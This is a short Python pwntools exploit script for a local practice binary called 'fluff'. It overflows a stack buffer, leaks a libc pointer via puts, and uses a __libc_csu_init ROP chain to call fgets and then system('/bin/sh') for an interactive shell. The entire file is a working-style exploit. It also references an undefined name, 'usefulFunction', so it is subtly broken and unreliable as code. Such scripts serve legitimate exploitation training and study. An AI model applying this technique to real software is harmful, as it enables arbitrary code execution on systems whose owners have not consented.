from pwn import *

p = process("./fluff")
elf = ELF("./fluff")

def csu_init( addr_target_fuc_plt , arg_3 , arg_2 , arg_1):
	addr_init = 0x4008BA
	addr_call = 0x4008A0

	payload   	=  p64(addr_init) + p64(0) + p64(1) + p64(addr_target_fuc_plt) + p64(arg_3) + p64(arg_2) + p64(arg_1) 
	payload 	+=	p64(addr_call) + 'a' * 56 

	return payload

system_plt = elf.plt["system"]
bss = 0x601000 + 0x400 + 0x20
pwnme = elf.sym["pwnme"]
fgets = elf.got["fgets"]
pop_rdi = 0x4008c3
temp = 0x601090
stdin = 0x601070
puts_plt = elf.plt["puts"]

p.recvuntil("> ")
payload1 = 0x20 * "a" + "b" * 8 + p64(pop_rdi) + p64(stdin) + p64(puts_plt) + p64(pwnme)
p.sendline(payload1)

stdin = u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00"))
log.info(hex(stdin))
p.recvuntil("> ")
payload2 = "a" * 0x20 + "b" * 8 
payload2 += p64(pop_rdi) + p64(usefulFunction) + p64(puts_plt)
payload2 += csu_init(fgets , arg_1 = temp , arg_2 = 0x100 , arg_3 = stdin)
payload2 += p64(pop_rdi) + p64(temp) + p64(system_plt)
p.sendline(payload2)
p.recvuntil("\n")
p.sendline("/bin/sh\x00")

p.interactive()
